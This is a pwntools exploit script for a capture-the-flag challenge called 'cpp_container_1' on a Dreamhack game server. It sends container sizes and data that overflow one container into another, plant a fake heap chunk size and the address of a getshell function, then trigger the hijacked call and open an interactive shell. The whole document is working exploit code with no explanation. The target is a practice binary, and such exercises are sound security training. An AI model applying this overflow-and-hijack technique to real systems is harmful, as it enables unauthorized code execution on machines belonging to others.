#!/usr/bin/env python3
from pwn import *

PORT = 21460
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./cpp_container_1', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force

            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

getshell = 0x401041

sla(b'[*] select menu: ', b'2')
sla(b'Input container1 size', b'10')
sla(b'Input container2 size', b'3')

src = [0, 0, 0, 0, 0, 0, 0x21, 0,
       getshell & 0xffffffff,
       getshell >> 32]
dest = [0, 0, 0]

sla(b'[*] select menu: ', b'1')
payload = '\n'.join(map(str, src + dest)).encode()
sa(b'Input container1 data\n', payload + b'\n')

sla(b'[*] select menu: ', b'3')

p.interactive()